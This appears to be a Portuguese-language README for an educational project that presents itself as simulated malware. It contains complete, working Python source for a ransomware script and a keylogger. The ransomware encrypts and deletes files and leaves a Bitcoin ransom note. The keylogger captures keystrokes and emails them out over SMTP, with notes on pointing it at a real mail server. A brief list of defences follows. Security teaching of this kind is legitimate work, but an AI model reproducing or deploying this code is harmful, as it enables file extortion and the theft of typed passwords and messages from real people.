# Ransomware-Simulado
Implementei simulações de Ransomware e Keylogger em Python, com foco em aprendizado e defesa.

import os
from cryptography.fernet import Fernet
import base64

# Função para gerar chave de criptografia (simula uma chave secreta)
def gerar_chave():
    return Fernet.generate_key()

# Função para criptografar arquivos
def criptografar_arquivos(pasta, chave):
    fernet = Fernet(chave)
    for arquivo in os.listdir(pasta):
        caminho = os.path.join(pasta, arquivo)
        if os.path.isfile(caminho) and not arquivo.endswith('.encrypted'):
            with open(caminho, 'rb') as f:
                dados = f.read()
            dados_criptografados = fernet.encrypt(dados)
            with open(caminho + '.encrypted', 'wb') as f:
                f.write(dados_criptografados)
            os.remove(caminho)  # Remove o original (simulação de sequestro)

# Função para descriptografar arquivos
def descriptografar_arquivos(pasta, chave):
    fernet = Fernet(chave)
    for arquivo in os.listdir(pasta):
        caminho = os.path.join(pasta, arquivo)
        if arquivo.endswith('.encrypted'):
            with open(caminho, 'rb') as f:
                dados_criptografados = f.read()
            dados = fernet.decrypt(dados_criptografados)
            caminho_original = caminho.replace('.encrypted', '')
            with open(caminho_original, 'wb') as f:
                f.write(dados)
            os.remove(caminho)

# Função para criar mensagem de resgate
def criar_mensagem_resgate(pasta, chave):
    mensagem = f"""
    Seus arquivos foram criptografados!
    Para recuperar, pague 1 Bitcoin para a carteira: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
    Em seguida, envie a chave de descriptografia: {base64.b64encode(chave).decode()}
    (Isso é uma simulação - não pague nada!)
    """
    with open(os.path.join(pasta, 'RESGATE.txt'), 'w') as f:
        f.write(mensagem)

# Simulação principal
if __name__ == "__main__":
    pasta_teste = './pasta_teste'  # Crie uma pasta com arquivos de teste (ex: texto.txt)
    os.makedirs(pasta_teste, exist_ok=True)
    
    chave = gerar_chave()
    print("Chave gerada (guarde para descriptografia):", base64.b64encode(chave).decode())
    
    # Criptografa
    criptografar_arquivos(pasta_teste, chave)
    criar_mensagem_resgate(pasta_teste, chave)
    print("Arquivos criptografados. Mensagem de resgate criada.")
    
    # Para descriptografar (descomente após teste)
    # descriptografar_arquivos(pasta_teste, chave)
    # print("Arquivos descriptografados.")


    Keylogger Simulado
Este script captura teclas pressionadas e salva em um arquivo .txt. Ele é "furtivo" (não mostra janelas visíveis) e simula envio por e-mail (usando SMTP simulado; ajuste para um servidor real como Gmail, mas use credenciais de teste).

import pynput
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
import threading
import time

# Arquivo para salvar logs
log_file = 'keylog.txt'

# Função para escrever no log
def escrever_log(tecla):
    tecla = str(tecla).replace("'", "")
    if tecla == 'Key.space':
        tecla = ' '
    elif tecla == 'Key.enter':
        tecla = '\n'
    elif tecla.startswith('Key.'):
        tecla = f'[{tecla[4:]}]'
    
    with open(log_file, 'a') as f:
        f.write(tecla)

# Função para enviar e-mail (simulado - ajuste credenciais)
def enviar_email():
    while True:
        time.sleep(60)  # Envia a cada 60 segundos (simulação)
        try:
            with open(log_file, 'r') as f:
                conteudo = f.read()
            if conteudo:
                msg = MIMEText(conteudo)
                msg['Subject'] = 'Log de Teclas - Simulação'
                msg['From'] = 'seuemail@teste.com'  # Use um e-mail de teste
                msg['To'] = 'destino@teste.com'
                
                # Simulação SMTP (use um servidor real como smtp.gmail.com:587)
                server = smtplib.SMTP('smtp.test.com', 587)  # Ajuste para servidor real
                server.starttls()
                server.login('usuario', 'senha')  # Credenciais de teste
                server.sendmail(msg['From'], msg['To'], msg.as_string())
                server.quit()
                
                # Limpa log após envio
                open(log_file, 'w').close()
                print("Log enviado por e-mail.")
        except Exception as e:
            print(f"Erro no envio: {e}")

# Função principal
def main():
    # Inicia thread de envio de e-mail
    threading.Thread(target=enviar_email, daemon=True).start()
    
    # Listener de teclado (furtivo)
    with Listener(on_press=escrever_log) as listener:
        listener.join()

if __name__ == "__main__":
    main()


Reflexão sobre Defesa e Prevenção
Malwares como ransomware e keyloggers exploram vulnerabilidades humanas (ex: cliques em links suspeitos) e técnicas (ex: criptografia fraca). Medidas de defesa incluem:

Antivírus e EDR: Ferramentas como Malwarebytes ou Windows Defender detectam comportamentos suspeitos (ex: criptografia em massa).
Firewall e Sandboxing: Bloqueie conexões não autorizadas e execute códigos suspeitos em ambientes isolados (ex: usando Docker ou VMs).
Conscientização do Usuário: Treinamentos para reconhecer phishing, evitar downloads de fontes desconhecidas e usar senhas fortes/2FA.
Backups e Atualizações: Faça backups regulares e mantenha sistemas atualizados para corrigir vulnerabilidades.
Detecção: Monitore logs de sistema e use ferramentas como Wireshark para tráfego suspeito.
Legal: Em cenários reais, reporte a autoridades (ex: CERT.br no Brasil).


# Malware Simulado em Python

Este projeto simula Ransomware e Keylogger para fins educacionais, demonstrando conceitos de segurança cibernética.

## Objetivos
- Compreender funcionamento de malwares.
- Implementar scripts simulados em Python.
- Refletir sobre defesa e prevenção.

## Estrutura
- `ransomware_simulado.py`: Simula criptografia de arquivos e mensagem de resgate.
- `keylogger_simulado.py`: Captura teclas e simula envio por e-mail.
- `pasta_teste/`: Arquivos de teste para ransomware.
- `images/`: Capturas de tela dos testes.

## Como Executar
1. Instale dependências: `pip install cryptography pynput`.
2. Rode em ambiente controlado (VM ou sandbox).
3. Teste e documente aprendizados.

## Reflexão sobre Defesa
[Insira sua reflexão aqui, baseada no texto acima.]

## Licença
Educacional - Não use para fins maliciosos.
